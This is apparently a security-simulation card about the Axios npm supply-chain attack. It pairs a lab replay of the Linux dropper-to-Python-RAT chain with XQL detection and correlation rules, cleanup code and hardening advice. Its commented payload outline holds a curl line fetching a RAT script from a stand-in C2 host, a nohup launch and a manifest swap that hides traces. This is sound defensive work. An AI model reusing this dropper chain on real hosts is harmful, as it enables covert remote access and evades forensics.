identity.name: Axios npm Supply Chain — plain-crypto-js Postinstall Dropper to a Linux Python RAT (rundir, runscript, peinject, kill)
identity.summary: A hijacked Axios maintainer account published axios 1.14.1 and 0.30.4 with plain-crypto-js@4.2.1 injected as a dependency. Its postinstall hook runs an obfuscated setup.js that fetches a Python RAT to /tmp/ld.py, launches it with nohup and then erases its own traces. The RAT beacons by HTTP POST and takes four commands.
identity.description: Source: Unit 42, 'Threat Brief: Widespread Impact of the Axios Supply Chain Attack' (published 2026-04-01; Unit 42 stopped updating the brief on 2026-05-19). The axios source code was not modified: the compromised releases add plain-crypto-js@4.2.1 as a runtime dependency, and npm's postinstall lifecycle hook runs its dropper, setup.js, in the background. setup.js hides its strings with string reversal, Base64 and an XOR cipher (key OrDeR_7077), queries the operating system and POSTs a platform-specific body to the C2 on port 8000: packages.npm[.]org/product0 for macOS, product1 for Windows, product2 for Linux. On Linux it downloads a Python RAT to /tmp/ld.py and runs it in the background with nohup, passing the C2 URL as the only argument. It then deletes setup.js and replaces the tampered package.json with a clean decoy named package.md; Unit 42 puts install-to-compromise at roughly 15 seconds. The C++, PowerShell and Python payloads implement one RAT with an identical protocol: Base64-encoded JSON by HTTP POST, a 60-second beacon, one hard-coded Internet Explorer 8 user-agent, and four commands (kill, runscript, peinject, rundir). Unit 42 names no actor of its own; it reports overlap with activity previously reported as involving the DPRK and with the WAVESHAPER backdoor. Affected sectors named by Unit 42, across the U.S., Europe, the Middle East, South Asia and Australia: business services, customer service, financial services, high tech, higher education, insurance, media and entertainment, medical equipment, professional and legal services, and retail. Linked source: the Unit 42 post links an Elastic Security Labs analysis that documents Linux RAT internals Unit 42 does not (message type names, the position-dependent XOR key index, the Script and Param fields, the peinject drop to a hidden six-character file under /tmp). Wherever this card uses one of those details it says 'linked source'; they are Elastic's findings, not Unit 42's. What SIM-KOI-012 does: it executes the Linux second stage for real inside /var/tmp/.cortexsim-axios with a benign stand-in RAT. The npm install and node setup.js hop is staged on disk only, because the lab endpoint has no node. The published C2 is never contacted; executed calls go to a .invalid canary, and the one real download is Palo Alto Networks' official WildFire test ELF, which the RAT's peinject verb drops and runs. What the scenario declares: the agent's Local Analysis Malware verdict on that payload (built-in, observed in this lab for the same file), six XQL validation rows (Tier-2 verify only), and the operator-installed correlation CR-KOI-0012. Everything else on this card is hunt or reference content that the scenario does not declare: the Unit 42 hunting queries, the published IOCs, three operator-installable BIOCs and the network legs. tenant-verified: 0. No run of SIM-KOI-012 has executed against a live Cortex tenant; authored is not proven.

payload.code:
# NOT A SUBSTITUTE FOR THE SCENARIO: scenarios/koi/sim-koi-012-axios-supply-chain-python-rat.yml is the delivery path (seven steps, 40 s apart). This is the shape only; it stages no RAT and reaches no detection.
R=/var/tmp/.cortexsim-axios
# 1 stage node_modules/axios and node_modules/plain-crypto-js, decode the dropper string table with python3
# 2 curl -o "$R/tmp/ld.py" -d packages.npm.org/product2 -s --max-time 3 http://axios-c2.cortexsim-canary.invalid:8000/6202033
# 3 nohup python3 "$R/tmp/ld.py" http://axios-c2.cortexsim-canary.invalid:8000/6202033 &
# 4 rm setup.js; mv package.md package.json
# 5 task the RAT: rundir, runscript
# 6 task the RAT: peinject with the WildFire test ELF
# 7 task the RAT: kill

expected_artifacts.description: The poisoned package tree: package.json, package.md and setup.js under node_modules/plain-crypto-js.
curl with the Linux POST body and the mirrored drop path; the canary host never resolves.
The RAT stand-in written at the mirror of /tmp/ld.py.
python3 started on ld.py with the C2 canary URL as its argument; long-lived.
The dropper's manifest swap: mv renames package.md over package.json.
runscript: a shell child of the RAT, then id, uname and ls.
peinject: the WildFire test ELF executed from a hidden six-character dot-file, then the agent's Local Analysis Malware issue.

cleanup.code:
P=/var/tmp/.cortexsim-axios/run/ld.pid
if [ -f "$P" ] && grep -q cortexsim-axios "/proc/$(cat "$P")/cmdline" 2>/dev/null; then kill "$(cat "$P")" 2>/dev/null; fi
rm -rf /var/tmp/.cortexsim-axios

biocs.name: KOI-012 Interpreter Started On Tmp Script With HTTP URL Argument
biocs.description: A script interpreter starts with a script under /tmp (or /var/tmp) as its first argument and an http or https URL as the next. This is the shape of Figure 1's Linux launch line, python3 /tmp/ld.py followed by the C2 URL, and of the mirrored launch in SIM-KOI-012 step-03. Operator-installed and NOT declared by SIM-KOI-012 (the lab tenant lists 0 custom BIOC rules, so the scenario expects nothing from it). To use it, create a BIOC rule in the tenant from the XQL below at severity Medium; CortexSim never writes it. Untested in any tenant.

dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter agent_os_type = ENUM.AGENT_OS_LINUX
| filter action_process_image_command_line ~= "(python[0-9.]*|perl|ruby|node) +(/var)?/tmp/[^ ]+ +https?://"

correlation_rules.name: KOI-012 Axios Postinstall Dropper To Python RAT Payload Execution
correlation_rules.logic:
Operator-installed correlation rule (CortexSim never writes it). Alert name EXACTLY as this rule's name; severity Medium; Scheduled, every 10 minutes, query time frame 1 hour; alert field mapping: agent_hostname -> Host Name, agent_id -> Agent ID (the mapped artifacts are what let a correlation issue join a case); MITRE tag T1219 only, so the issue is not credited to another step's row by technique. UNTESTED: this XQL has not been run in any tenant. Its shape follows CR-EDR-0023, which was tested read-only in the lab tenant on 2026-11-11. It is built only from events SIM-KOI-012 produces on one host, and every leg also matches the unmirrored path the real threat uses (/tmp/ld.py and a hidden six-character file under /tmp). It fires when the RAT runs a hidden dot-file AND at least two of the other three legs are present, so one missing file sub-type does not silence it. While the events stay inside the one-hour time frame it fires again on every scheduled run. XQL:
dataset = xdr_data
| filter agent_os_type = ENUM.AGENT_OS_LINUX
| alter leg = if(event_type = ENUM.FILE and action_file_path ~= "node_modules/plain-crypto-js", "package", if(event_type = ENUM.FILE and action_file_path ~= "/tmp/ld[.]py$", "rat_dropped", if(event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and action_process_image_command_line ~= "/tmp/ld[.]py +https?://", "rat_launched", if(event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and actor_process_command_line ~= "/tmp/ld[.]py" and action_process_image_path ~= "/tmp/[.][A-Za-z0-9]{6}$", "payload_executed", "other"))))
| filter leg in ("package", "rat_dropped", "rat_launched", "payload_executed")
| alter payload = if(leg = "payload_executed", 1, 0)
| comp count_distinct(leg) as legs, max(payload) as payload_executed, count() as events, min(_time) as first_seen, max(_time) as last_seen by agent_hostname, agent_id
| filter legs >= 3 and payload_executed = 1

prevention_modules.name: Local Analysis Malware
prevention_modules.description: The agent's Local Analysis verdict when the WildFire test ELF is executed. Observed in this lab on 2026-11-11: HIGH, detection method TRAPS, action REPORTED under a report-mode policy; it opened a case and SimCore reconcile matched it. In SIM-KOI-012 the same file is executed by the RAT's peinject verb: python3 writes it to a hidden dot-file and starts it. That variant (python3 as the parent, a dot-file name) has not been observed yet. Issues named Local Analysis are deduplicated for one hour per file, so do not run this within an hour of another execution of the test ELF on the host. Do not key on the ELF's hash: two downloads seconds apart on 2026-11-11 returned two different SHA256 values, so whether the dedup carries from one run to the next is unverified and the spacing rule is kept. Declared with outcome: detect. This is the scenario's only built-in Medium-or-higher issue. No verdict is declared on ld.py itself: Unit 42 reports out-of-the-box prevention of the second stage for Windows and macOS only, and the lab RAT is a benign stand-in.

analytics_modules: Not declared (built-in XDR Analytics BIOC, Low, never joins a case): 'UNIX LOLBIN process connected to a rare external host'. Observed once in this lab on curl to the WildFire URL. It is rarity-based, this host has reached that URL several times since, and the .invalid canary never connects.

Not declared (built-in XDR Analytics BIOC, Low): 'Uncommon Linux shell command execution'. Rarity-based; the lab read-back does not say which command line raised it, so no step here is claimed to produce its trigger.

Not declared ('WildFire Malware', MEDIUM): observed in this lab only when the same ELF was executed again from a second causality chain. This chain has one causality chain and no scheduler, so it may appear as an extra issue but is not an expectation.

Reference only (named in a Palo Alto Networks blog the Unit 42 post links): the Linux abnormal-communication analytics 'Process connected to a rare external host' and 'Recurring rare domain access'. The real RAT's 60-second beacon to a new domain is their trigger; the lab beacon targets a .invalid name and never connects.

Reference only (named in a Palo Alto Networks blog the Unit 42 post links): the Global Analytics supply-chain detectors of the form 'Globally uncommon action from a signed process'. They profile signed vendor applications across the customer base; a lab shell running a staged tree is not that.

Reference only (Unit 42 protections section): NGFW Threat Prevention signature 87121; Advanced URL Filtering and Advanced DNS Security classify the known IPs and domains as malicious. No firewall is in the lab path.

Hunt idea, no query here: the Internet Explorer 8 on Windows XP user-agent arriving from a Linux host, and a 60-second HTTP POST cadence to port 8000. Both need HTTP header visibility on a proxy or firewall.

threat_scenarios.name: Axios Supply Chain — Postinstall Dropper to a Linux Python RAT
threat_scenarios.description: Run the Linux second stage of the Axios supply chain attack for real in a sandbox and check three things: the endpoint recorded each stage, the payload the RAT drops and runs draws a Medium-or-higher malware verdict, and an operator-installed correlation ties the stages into one issue.

threat_steps.objective: The poisoned dependency tree, the first-stage fetch and the RAT launch are recorded on the endpoint.
preconditions: Linux endpoint with the Cortex XDR agent, python3 and curl.
steps: Stage node_modules/axios and node_modules/plain-crypto-js and decode the dropper string table.
POST the Linux body to the .invalid canary and write the RAT stand-in at the mirrored /tmp/ld.py.
Launch it with nohup and the C2 canary URL as its argument.
success_criteria: XQL `KOI-012 Plain Crypto JS Tree Written And Setup JS Strings Decoded` returns a row.
XQL `KOI-012 First Stage Fetch And RAT Script Written At Mirrored Tmp Ld Py` returns a row.

These rows are scored by Tier-2 verify only and never raise Detection Accuracy.

threat_steps.objective: The dropper's anti-forensics and the RAT's rundir and runscript verbs are recorded.
preconditions: TS-KOI-012A ran and the RAT is alive.
steps: Remove setup.js and rename package.md over package.json.
Task the RAT with rundir on the decoy home, then runscript.
success_criteria: XQL `KOI-012 Decoy Manifest Renamed Over Package Json` returns a row.
XQL `KOI-012 RAT Runscript Spawns Shell Child` returns a row.

threat_steps.objective: peinject runs the WildFire test ELF, the agent raises a HIGH malware verdict, and the correlation ties the chain into one issue.
preconditions: No execution of the WildFire test ELF on the host in the previous hour.
steps: Fetch the WildFire test ELF and task the RAT with peinject.
Task the RAT with kill and confirm it exited.
success_criteria: Issue `Local Analysis Malware` (HIGH) on the endpoint: alert-backed.
Issue `KOI-012 Axios Postinstall Dropper To Python RAT Payload Execution` (Medium) from CR-KOI-0012: alert-backed, and only if the operator installed the rule.
XQL `KOI-012 RAT Peinject Runs Hidden Dot File` returns a row (Tier-2 verify only).
Not a criterion: the Unit 42 hunting queries, the IOC matches, the three BIOCs and every network leg. The scenario declares none of them.

preventive_controls: Audit for the compromised releases named by Unit 42: axios 1.14.1 and 0.30.4, and plain-crypto-js 4.2.0 and 4.2.1. Unit 42 names 1.14.0 and 0.30.3 as the safe downgrades.
Treat any host that installed a compromised release as compromised: rotate the credentials and tokens reachable from it, and check for the per-OS artefacts (/tmp/ld.py on Linux).
Block egress to the published C2 domain and IP address and review outbound connections on port 8000.
Pin dependencies with a lockfile and install with lifecycle scripts disabled where the build allows it, so a transitive postinstall hook does not run on install.
Apply a release cooldown or an internal registry proxy so a version published minutes ago is not installed fleet-wide.
detection_engineering: Key on behaviour, not on the artefact names alone: an interpreter started on a script under /tmp with an http URL argument, and an interpreter that runs a hidden dot-file under /tmp, both survive a renamed payload.

node_modules is cleaned after the fact: setup.js is deleted and the manifest is swapped, so a later directory listing shows nothing. Detect at install time (file and process events) and compare the lockfile with the installed manifest.

The four Unit 42 queries are carried here as published, with one repair: the File Indicators query lacks the ENUM. prefix on its three event_sub_type values in the published text, and the copy on this card adds it. The NGFW query reads panw_ngfw_url_raw joined to panw_ngfw_traffic_raw and is carried as the evidence query of the firewall entry in the product mapping.

On the lab endpoint FILE_DIR_CREATE and FILE_RENAME have not been observed, so the scenario's validation rows accept a file create or write, or a process start, where Unit 42's queries key on directory and rename sub-types.
Use actor_causality_id, not a bare causality_id, and timestamp_diff(current_time(), _time, "SECOND") for time windows: the lab tenant rejected the other forms.

Keep operator rules at Medium or higher and map agent_hostname and agent_id in the correlation's alert fields. Low issues never create or join a case, and a correlation issue groups only through mapped artifacts.
